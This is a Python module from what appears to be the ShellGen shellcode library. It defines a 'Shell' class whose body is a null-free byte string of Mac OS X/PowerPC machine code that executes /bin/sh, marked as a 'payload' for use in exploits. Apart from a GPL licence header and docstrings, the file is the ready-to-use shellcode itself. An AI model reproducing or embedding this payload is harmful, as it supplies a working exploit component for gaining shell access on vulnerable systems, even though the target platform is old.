#!/usr/bin/env python

###############################################################################
## Execute /bin/sh in MacOSX/PowerPC                                         ##
## Shellcode for ShellGen                                                    ##
## Based on original code by pancake from 48bits                             ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2013 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Execute /bin/sh."

__all__ = ["Shell"]

from shellgen import Static

class Shell (Static):
    """
    Execute /bin/sh in MacOSX/PowerPC.

    Based on original code by pancake from 48bits:
    U{http://radare.org/y/}
    """

    qualities = "payload"
    encoding  = "nullfree"

    bytes = (
        "\x7c\xa5\x2a\x79\x40\x82\xff\xfd"
        "\x7d\x68\x02\xa6\x3b\xeb\x01\x70"
        "\x39\x40\x01\x70\x39\x1f\xfe\xcf"
        "\x7c\xa8\x29\xae\x38\x7f\xfe\xc8"
        "\x90\x61\xff\xf8\x90\xa1\xff\xfc"
        "\x38\x81\xff\xf8\x38\x0a\xfe\xcb"
        "\x44\xff\xff\x02\x7c\xa3\x2b\x78"
        "\x38\x0a\xfe\x91\x44\xff\xff\x02"
        "\x2f\x62\x69\x6e\x2f\x73\x68\x58"
    )
